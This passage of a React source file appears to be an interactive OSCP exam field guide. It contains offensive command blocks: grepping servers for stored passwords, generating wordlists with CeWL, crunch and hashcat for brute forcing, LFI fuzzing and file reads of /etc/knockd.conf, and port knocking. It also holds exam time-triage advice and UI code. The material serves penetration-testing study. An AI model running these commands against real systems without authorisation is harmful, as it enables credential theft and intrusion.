find / -mmin -10 -type f 2>/dev/null | grep -v proc
find / -mmin -60 -type f -name "*.txt" -o -name "*.conf" 2>/dev/null | grep -v proc

# ── QUICK GREP ALL PASSWORDS ─────────────
grep -r "password" /var/www/ 2>/dev/null | grep -v "Binary\|\.swp"
grep -r "password" /opt/ 2>/dev/null | grep -v Binary
grep -rn "pass" /home/ 2>/dev/null | grep -v "Binary\|\.swp\|#"`,
    warn: "wp-config.php is the single most valuable file on a WordPress server — it contains database credentials that almost always reuse the system user password. Find it first.",
    choices: [
      { label: "Found credentials in config", next: "creds_found" },
      { label: "Found SSH key", next: "ssh_key" },
      { label: "Found DB creds — connect to DB", next: "mysql" },
      { label: "Nothing — back to automated enum", next: "linpeas" },
    ],
  },

  // ══════════════════════════════════════════
  //  CUSTOM WORDLISTS
  // ══════════════════════════════════════════

  custom_wordlist: {
    phase: "RECON",
    title: "Custom Wordlist Generation",
    body: "Rockyou fails when the password is application-specific or site-related. Generate custom wordlists from the target itself. CeWL scrapes the website. Username mutation covers credential stuffing. Crunch generates pattern-based lists.",
    cmd: `# ── CEWL — SCRAPE TARGET WEBSITE ─────────
# Generates wordlist from words found on the target site
cewl http://$IP -d 3 -m 5 -w /tmp/cewl_wordlist.txt
# -d 3 = crawl depth 3
# -m 5 = minimum word length 5

# With authentication
cewl http://$IP -d 3 -m 5   --auth_type basic --auth_user admin --auth_pass password   -w /tmp/cewl_auth.txt

# Include email addresses found
cewl http://$IP -d 2 -e -w /tmp/cewl_emails.txt

# ── USERNAME GENERATION ───────────────────
# From a name list (First Last format):
# Use username-anarchy or custom script
cat names.txt | while read line; do
  first=\$(echo \$line | cut -d' ' -f1 | tr '[:upper:]' '[:lower:]')
  last=\$(echo \$line | cut -d' ' -f2 | tr '[:upper:]' '[:lower:]')
  echo "\$first"
  echo "\$last"
  echo "\${first}.\${last}"
  echo "\${first}\${last}"
  echo "\${first:0:1}\${last}"
  echo "\${first:0:1}.\${last}"
done > /tmp/usernames.txt

# username-anarchy tool
username-anarchy -i names.txt > /tmp/usernames.txt

# ── CRUNCH — PATTERN-BASED ────────────────
# Syntax: crunch [min] [max] [charset] -t [pattern] -o [file]

# All 8-char lowercase
crunch 8 8 abcdefghijklmnopqrstuvwxyz -o /tmp/8char.txt

# Pattern: Company + 4 digits (e.g. Corp1234)
crunch 8 8 -t Corp%%%% -o /tmp/corp_pass.txt

# Pattern: Month + Year (Jan2023)
crunch 7 7 -t @@@%%%%   -p Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec   -o /tmp/months.txt

# ── HASHCAT RULES ON WORDLIST ─────────────
# Mutate cewl output with rules
hashcat cewl_wordlist.txt -r /usr/share/hashcat/rules/best64.rule   --stdout > /tmp/mutated.txt

hashcat cewl_wordlist.txt   -r /usr/share/hashcat/rules/dive.rule   --stdout > /tmp/mutated_dive.txt

# ── LFI WORDLISTS ─────────────────────────
# Linux LFI
ls /opt/SecLists/Fuzzing/LFI/
# Best: LFI-Jhaddix.txt (combined), LFI-gracefulsecurity-linux.txt

# Windows LFI — specific to Windows paths
/opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
# Contains: C:\Windows\win.ini, web.config, applicationHost.config, etc.

# Use with ffuf:
ffuf -u "http://$IP/page?file=FUZZ"   -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt   -fw 0 -mc 200

# ── WEB DIRECTORY WORDLISTS ───────────────
# Fast (CTF/exam): raft-medium-directories.txt
# Thorough: directory-list-2.3-medium.txt
# API endpoints: api/actions.txt, burp-parameter-names.txt
# Backup files: /opt/SecLists/Discovery/Web-Content/raft-medium-extensions.txt

# ── COMBINE WORDLISTS ─────────────────────
cat rockyou.txt cewl_wordlist.txt | sort -u > /tmp/combined.txt`,
    warn: "CeWL on a company portal often produces the exact password format used internally — CompanyName + year or product names. Run it before rockyou on any corporate-looking application.",
    choices: [
      { label: "Wordlist ready — brute force login", next: "bruteforce" },
      { label: "Wordlist ready — LFI fuzzing", next: "lfi" },
      { label: "Wordlist ready — directory fuzzing", next: "web_fuzz_deep" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  // ══════════════════════════════════════════
  //  PORT KNOCKING
  // ══════════════════════════════════════════

  port_knocking: {
    phase: "RECON",
    title: "Port Knocking",
    body: "A firewall rule opens a port after receiving connections to a specific sequence of ports. Common on OSCP — usually hinted at in a config file or readme. The sequence is the key.",
    cmd: `# ── HOW TO DETECT ────────────────────────
# Hints that port knocking is in use:
# - /etc/knockd.conf readable (gives you the sequence)
# - README or note file mentions a sequence
# - nmap shows a port as filtered that should be open (SSH on filtered)
# - Searchsploit shows knockd on the target

# ── FIND THE SEQUENCE ─────────────────────
# If you have LFI or file read:
http://$IP/page?file=/etc/knockd.conf
# knockd.conf shows sequence like:
# sequence = 7000,8000,9000

# If you have a shell already:
cat /etc/knockd.conf
cat /etc/knockd.conf 2>/dev/null || find / -name knockd.conf 2>/dev/null

# ── EXECUTE THE KNOCK ─────────────────────
# Method 1: knock tool
knock $IP 7000 8000 9000
knock $IP 7000:udp 8000:tcp 9000:tcp   # if mix of UDP/TCP

# Method 2: nmap (no knock tool)
nmap -Pn --host-timeout 100 --max-retries 0 -p 7000 $IP
nmap -Pn --host-timeout 100 --max-retries 0 -p 8000 $IP
nmap -Pn --host-timeout 100 --max-retries 0 -p 9000 $IP

# Method 3: nc
nc -z $IP 7000
nc -z $IP 8000
nc -z $IP 9000

# ── VERIFY PORT OPENED ────────────────────
# After knock — check if target port is now open
nmap -Pn -p 22 $IP
# Should now show open instead of filtered

# ── TIMING ────────────────────────────────
# knockd has a timeout window (default 5 seconds between knocks)
# If sequence times out — repeat from beginning
# Some configs require specific intervals:
knock $IP 7000 && sleep 1 && knock $IP 8000 && sleep 1 && knock $IP 9000`,
    warn: "The sequence must be executed in exact order with no extra connections in between. If nmap scans between knocks — the sequence resets. Use the knock tool or careful nc, not nmap for the knock itself.",
    choices: [
      { label: "Port opened — SSH now accessible", next: "ssh_only" },
      { label: "Port opened — web service", next: "web_enum" },
      { label: "Still filtered — wrong sequence", next: "analyze_ambiguous" },
    ],
  },

  mindset_triage: {
    phase: "MINDSET",
    title: "Time Triage — Where to Spend What Remains",
    body: "At some point the exam becomes a resource allocation problem. You have time, machines, and partial progress. The path forward is not the most interesting machine — it is the highest expected value for the time remaining.",
    cmd: `# ── CURRENT STATE ASSESSMENT ────────────
# Fill this in right now:

# Standalone 1: local.txt? [Y/N]  proof.txt? [Y/N]  = __/20pts
# Standalone 2: local.txt? [Y/N]  proof.txt? [Y/N]  = __/20pts
# Standalone 3: local.txt? [Y/N]  proof.txt? [Y/N]  = __/20pts
# AD machine 1: local.txt? [Y/N]                    = __/10pts
# AD machine 2: local.txt? [Y/N]                    = __/10pts
# AD DC:        proof.txt? [Y/N]                    = __/40pts
# Bonus points:                                      = __/10pts
# CURRENT TOTAL:                                     __/100pts
# NEED TO PASS:  70pts

# ── DECISION FRAMEWORK ───────────────────
# Score >= 70 pts:
#   STOP HACKING. Document everything. Submit. Do not risk it.

# Score 50-69 pts:
#   Where is the closest partial flag?
#   A local.txt on a machine you have a shell on = 10pts.
#   One privesc from proof.txt = highest priority target.

# Score 30-49 pts:
#   Have you done full recon on ALL machines?
#   Is there a machine you have not seriously attempted?
#   AD set: if you have machine 1, the rest chain — push the AD.

# Score < 30 pts with < 6 hours left:
#   Abandon lowest-confidence machine entirely.
#   Focus ALL remaining time on ONE machine you understand best.
#   Partial flags count — local.txt with no proof.txt = 10pts not 0.

# ── PASS PATHS ───────────────────────────
# 3 full standalones (60) + bonus (10)          = 70 pass
# 2 full standalones (40) + 3 local.txt (30)    = 70 pass
# AD set (40) + 1 full standalone (20) + bonus  = 70 pass
# AD set (40) + 2 standalones partial (30)       = 70 pass`,
    warn: "70 points passes. You do not need to own everything. A clear-eyed view of your score and the fastest path to 70 is worth more than 2 hours of unfocused hacking.",
    choices: [
      { label: "Back to hacking — I know where to focus", next: "start" },
      { label: "Stop and document what I have", next: "reporting" },
      { label: "Still stuck on a machine", next: "mindset_stuck" },
    ],
  },
};

// ─────────────────────────────────────────────
//  PHASE METADATA
// ─────────────────────────────────────────────
const PHASES = {
  ANALYSIS:  { color: "#34d399", icon: "◎" },
  JUMP:      { color: "#f0abfc", icon: "⟡" },
  RECON:     { color: "#3b9eff", icon: "◉" },
  DISCOVERY: { color: "#38bdf8", icon: "◎" },
  PIVOT:     { color: "#f472b6", icon: "⟳" },
  WEB:       { color: "#ff8c42", icon: "◈" },
  SMB:       { color: "#ff6b9d", icon: "◆" },
  FTP:       { color: "#ff6b9d", icon: "◆" },
  SSH:       { color: "#ff6b9d", icon: "◆" },
  CREDS:     { color: "#ffd166", icon: "◐" },
  SHELL:     { color: "#ffd166", icon: "◐" },
  LINUX:     { color: "#06d6a0", icon: "▲" },
  WINDOWS:   { color: "#ffbe0b", icon: "■" },
  AD:        { color: "#b5179e", icon: "◈" },
  REPORT:    { color: "#a0aec0", icon: "✎" },
  MINDSET:   { color: "#c084fc", icon: "◯" },
};

// ─────────────────────────────────────────────
//  COMPONENT
// ─────────────────────────────────────────────
export default function OSCPAdventure() {
  const [history, setHistory] = useState(["start"]);
  const [copied, setCopied] = useState(false);
  const [animKey, setAnimKey] = useState(0);
  const topRef = useRef(null);

  const currentId = history[history.length - 1];
  const node = nodes[currentId];
  const phase = PHASES[node.phase] || PHASES.RECON;

  const go = (next) => {
    setHistory((h) => [...h, next]);
    setAnimKey((k) => k + 1);
    setTimeout(() => topRef.current?.scrollIntoView({ behavior: "smooth", block: "start" }), 50);
  };

  const back = () => {
    if (history.length > 1) {
      setHistory((h) => h.slice(0, -1));
      setAnimKey((k) => k + 1);
    }
  };

  const reset = () => {
    setHistory(["start"]);
    setAnimKey((k) => k + 1);
  };

  const copyCmd = () => {
    if (node.cmd) {
      navigator.clipboard.writeText(node.cmd);
      setCopied(true);
      setTimeout(() => setCopied(false), 1800);
    }
  };

  const [copiedMd, setCopiedMd] = useState(false);

  const copyObsidian = () => {
    const lines = [];
    lines.push(`# ${node.title}`);
    lines.push(`**Phase:** ${node.phase}  `);
    lines.push(`**Date:** ${new Date().toISOString().slice(0,10)}  `);
    lines.push(`**Node:** \`${currentId}\``);
    lines.push('');
    lines.push('## Guidance');
    lines.push(node.body);
    lines.push('');
    if (node.warn) {
      lines.push('> [!warning]');
      lines.push(`> ${node.warn}`);
      lines.push('');
    }
    if (node.cmd) {
      lines.push('## Commands');
      lines.push('```bash');
      lines.push(node.cmd);
      lines.push('```');
      lines.push('');
    }
    lines.push('## What I Found');
    lines.push('');
    lines.push('```');
    lines.push('');
    lines.push('```');
    lines.push('');
    lines.push('## Proof / Evidence');
    lines.push('');
    lines.push('- Screenshot: ');
    lines.push('- Output: ');
    lines.push('');
    lines.push('## Next Move');
    lines.push('');
    node.choices.forEach(c => {
      lines.push(`- [ ] ${c.label} → \`${c.next}\``);
    });
    lines.push('');
    lines.push('---');
    lines.push('*Generated by The Path — OSCP Field Guide*');
    navigator.clipboard.writeText(lines.join('\n'));
    setCopiedMd(true);
    setTimeout(() => setCopiedMd(false), 1800);
  };

  const phaseList = history.map((h) => nodes[h]?.phase).filter(Boolean);

  return (
    <div style={{
      minHeight: "100vh",
      background: "#080b0f",
      color: "#cdd6e0",
      fontFamily: "'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
    }}>

      {/* ── HEADER ─────────────────────────── */}
      <header ref={topRef} style={{
        width: "100%",
        background: "linear-gradient(180deg, #0c1018 0%, #080b0f 100%)",
        borderBottom: `1px solid ${phase.color}33`,
        padding: "14px 28px",
        display: "flex",
        alignItems: "center",
        justifyContent: "space-between",
        position: "sticky",
        top: 0,
        zIndex: 20,
        boxSizing: "border-box",
        boxShadow: `0 1px 30px ${phase.color}18`,
        transition: "border-color 0.4s, box-shadow 0.4s",
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
          <div style={{ display: "flex", flexDirection: "column", lineHeight: 1.1 }}>
            <div style={{
              fontSize: 17,
              fontWeight: 800,
              letterSpacing: 5,
              color: phase.color,
              textShadow: `0 0 16px ${phase.color}`,
              textTransform: "uppercase",
              transition: "color 0.4s, text-shadow 0.4s",
            }}>
              THE PATH
            </div>
            <div style={{
              fontSize: 10,
              letterSpacing: 3,
              color: "#3a4858",
              textTransform: "uppercase",
              marginTop: 2,
            }}>
              OSCP Field Guide
            </div>
          </div>
          <div style={{
            width: 1,
            height: 16,
            background: "#2a3040",
          }} />
          <div style={{
            fontSize: 17,
            letterSpacing: 3,
            color: "#4a5568",
            textTransform: "uppercase",
          }}>
            {phase.icon} {node.phase}
          </div>
        </div>

        <div style={{ display: "flex", gap: 6 }}>
          <button
            onClick={back}
            disabled={history.length <= 1}
            style={{
              background: "transparent",
              border: "1px solid #1e2838",
              color: history.length > 1 ? "#8899aa" : "#2a3040",
              padding: "5px 12px",
              cursor: history.length > 1 ? "pointer" : "default",
              fontFamily: "inherit",
              fontSize: 17,
              letterSpacing: 2,
              borderRadius: 2,
              textTransform: "uppercase",
              transition: "all 0.2s",
            }}
            onMouseEnter={e => { if (history.length > 1) e.currentTarget.style.borderColor = "#3a4858"; }}
            onMouseLeave={e => { e.currentTarget.style.borderColor = "#1e2838"; }}
          >← back</button>

          <button
            onClick={reset}
            style={{
              background: "transparent",
              border: "1px solid #3a1a1a",
              color: "#ff4d6a",
              padding: "5px 12px",
              cursor: "pointer",
              fontFamily: "inherit",
              fontSize: 17,
              letterSpacing: 2,
              borderRadius: 2,
              textTransform: "uppercase",
              transition: "all 0.2s",
            }}
            onMouseEnter={e => e.currentTarget.style.background = "#ff4d6a18"}
            onMouseLeave={e => e.currentTarget.style.background = "transparent"}
          >⟳ reset</button>
        </div>
      </header>

      {/* ── PHASE TRAIL ────────────────────── */}
      <div style={{
        width: "100%",
        maxWidth: 1100,
        padding: "10px 28px 0",
        boxSizing: "border-box",
        display: "flex",
        alignItems: "center",
        gap: 4,
        flexWrap: "wrap",
        fontSize: 17,
        color: "#3a4858",
        letterSpacing: 1,
      }}>
        {history.map((h, i) => {
          const n = nodes[h];
          const p = PHASES[n?.phase] || PHASES.RECON;
          return (
            <span key={i} style={{ display: "flex", alignItems: "center", gap: 4 }}>
              <span style={{
                color: i === history.length - 1 ? p.color : "#3a4858",
                transition: "color 0.3s",
              }}>
                {n?.title?.replace(/[^a-zA-Z0-9 ]/g, "").trim().slice(0, 18) || ""}
              </span>
              {i < history.length - 1 && <span style={{ color: "#1e2838" }}>›</span>}
            </span>
          );
        })}
      </div>

      {/* ── MAIN CARD ──────────────────────── */}
      <main style={{
        width: "100%",
        maxWidth: 1100,
        padding: "16px 28px 48px",
        boxSizing: "border-box",
      }}>
        <div
          key={animKey}
          style={{
            animation: "fadeSlide 0.25s ease-out both",
          }}
        >
          {/* Card */}
          <div style={{
            background: "#0c1018",
            border: `1px solid ${phase.color}2a`,
            borderRadius: 6,
            overflow: "hidden",
            boxShadow: `0 0 60px ${phase.color}0d`,
            transition: "border-color 0.4s, box-shadow 0.4s",
          }}>

            {/* Card top bar */}
            <div style={{
              background: `linear-gradient(90deg, ${phase.color}14 0%, transparent 70%)`,
              borderBottom: `1px solid ${phase.color}20`,
              padding: "18px 24px 14px",
            }}>
              <div style={{
                fontSize: 16,
                letterSpacing: 4,
                color: phase.color,
                textTransform: "uppercase",
                marginBottom: 8,
                opacity: 0.7,
              }}>
                {`[ ${node.phase} // STEP ${history.length} ]`}
              </div>
              <h1 style={{
                margin: 0,
                fontSize: 26,
                fontWeight: 700,
                color: "#e8f0f8",
                letterSpacing: 0.5,
                lineHeight: 1.2,
              }}>
                {node.title}
              </h1>
            </div>

            {/* Card body */}
            <div style={{ padding: "20px 24px 24px" }}>

              {/* Body text */}
              <p style={{
                margin: "0 0 20px",
                fontSize: 17,
                lineHeight: 1.9,
                color: "#8899aa",
                paddingLeft: 14,
                borderLeft: `2px solid ${phase.color}55`,
              }}>
                {node.body}
              </p>

              {/* Warning */}
              {node.warn && (
                <div style={{
                  background: "#1a1200",
                  border: "1px solid #ffd16633",
                  borderLeft: "3px solid #ffd166",
                  borderRadius: "0 4px 4px 0",
                  padding: "10px 14px",
                  marginBottom: 20,
                  fontSize: 15,
                  color: "#ffd166cc",
                  lineHeight: 1.6,
                }}>
                  ⚠ {node.warn}
                </div>
              )}

              {/* Commands */}
              {node.cmd && (
                <div style={{ marginBottom: 24 }}>
                  <div style={{
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                    marginBottom: 6,
                  }}>
                    <span style={{
                      fontSize: 16,
                      letterSpacing: 3,
                      color: phase.color,
                      textTransform: "uppercase",
                      opacity: 0.8,
                    }}>
                      commands
                    </span>
                    <div style={{ display: "flex", gap: 8 }}>
                    <button
                      onClick={copyCmd}
                      style={{
                        background: copied ? `${phase.color}22` : "transparent",
                        border: `1px solid ${phase.color}44`,
                        color: phase.color,
                        padding: "3px 10px",
                        cursor: "pointer",
                        fontFamily: "inherit",
                        fontSize: 16,
                        letterSpacing: 2,
                        borderRadius: 2,
                        textTransform: "uppercase",
                        transition: "all 0.2s",
                      }}
                    >
                      {copied ? "✓ copied" : "copy"}
                    </button>
                    <button
                      onClick={copyObsidian}
                      style={{
                        background: copiedMd ? "#7c3aed22" : "transparent",
                        border: "1px solid #7c3aed55",
                        color: copiedMd ? "#a78bfa" : "#7c3aed",
                        padding: "3px 10px",
                        cursor: "pointer",
                        fontFamily: "inherit",
                        fontSize: 16,
                        letterSpacing: 2,
                        borderRadius: 2,
                        textTransform: "uppercase",
                        transition: "all 0.2s",
                      }}
                    >
                      {copiedMd ? "✓ vault" : "⟡ obsidian"}
                    </button>
                    </div>
                  </div>
                  <pre style={{
                    background: "#060a0e",
                    border: `1px solid #1a2838`,
                    borderLeft: `3px solid ${phase.color}88`,
                    padding: "16px 18px",
                    margin: 0,
                    fontSize: 15,
                    lineHeight: 1.75,
                    color: "#7ecb9e",
                    overflowX: "auto",
                    borderRadius: "0 4px 4px 0",
                    whiteSpace: "pre",
                  }}>
                    {node.cmd}
                  </pre>
                </div>
              )}

              {/* Choices */}
              <div>
                <div style={{
                  fontSize: 16,
                  letterSpacing: 3,
                  color: "#3a4858",
                  textTransform: "uppercase",
                  marginBottom: 10,
                }}>
                  what did you find?
                </div>
                <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                  {node.choices.map((c, i) => {
                    const np = nodes[c.next];
                    const nc = PHASES[np?.phase]?.color || phase.color;
                    return (
                      <button
                        key={i}
                        onClick={() => go(c.next)}
                        style={{
                          background: `linear-gradient(90deg, ${nc}0c 0%, transparent 80%)`,
                          border: `1px solid ${nc}30`,
                          borderLeft: `3px solid ${nc}66`,
                          color: "#8899aa",
                          padding: "11px 16px",
                          cursor: "pointer",
                          fontFamily: "inherit",
                          fontSize: 16,
                          textAlign: "left",
                          borderRadius: "0 4px 4px 0",
                          transition: "all 0.15s",
                          display: "flex",
                          alignItems: "center",
                          gap: 10,
                        }}
                        onMouseEnter={e => {
                          e.currentTarget.style.background = `linear-gradient(90deg, ${nc}1a 0%, transparent 80%)`;
                          e.currentTarget.style.borderLeftColor = nc;
                          e.currentTarget.style.color = "#ddeeff";
                        }}
                        onMouseLeave={e => {
                          e.currentTarget.style.background = `linear-gradient(90deg, ${nc}0c 0%, transparent 80%)`;
                          e.currentTarget.style.borderLeftColor = `${nc}66`;
                          e.currentTarget.style.color = "#8899aa";
                        }}
                      >
                        <span style={{
                          fontSize: 16,
                          color: nc,
                          opacity: 0.8,
                          minWidth: 14,
                          fontWeight: 700,
                        }}>▶</span>
                        {c.label}
                        <span style={{
                          marginLeft: "auto",
                          fontSize: 16,
                          color: nc,
                          opacity: 0.5,
                          letterSpacing: 1,
                          textTransform: "uppercase",
                        }}>
                          {np?.phase}
                        </span>
                      </button>
                    );
                  })}
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* ── LEGEND ───────────────────────── */}
        <div style={{
          marginTop: 28,
          display: "flex",
          gap: 14,
          flexWrap: "wrap",
          justifyContent: "center",
          fontSize: 16,
          letterSpacing: 2,
          color: "#3a4858",
          textTransform: "uppercase",
        }}>
          {Object.entries(PHASES).filter(([k]) => !["FTP","SSH"].includes(k)).map(([label, { color: c, icon }]) => (
            <div key={label} style={{ display: "flex", alignItems: "center", gap: 5, opacity: node.phase === label ? 1 : 0.5, transition: "opacity 0.3s" }}>
              <div style={{ width: 6, height: 6, background: c, borderRadius: 1, boxShadow: node.phase === label ? `0 0 8px ${c}` : "none", transition: "box-shadow 0.3s" }} />
              {label}
            </div>
          ))}
        </div>
      </main>

      <style>{`
        @keyframes fadeSlide {
          from { opacity: 0; transform: translateY(8px); }
          to   { opacity: 1; transform: translateY(0); }
        }
        * { box-sizing: border-box; }
        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-track { background: #080b0f; }
        ::-webkit-scrollbar-thumb { background: #1e2838; border-radius: 2px; }
        button:focus { outline: none; }
        pre { scrollbar-width: thin; scrollbar-color: #1e2838 #060a0e; }
      `}</style>
    </div>
  );
}
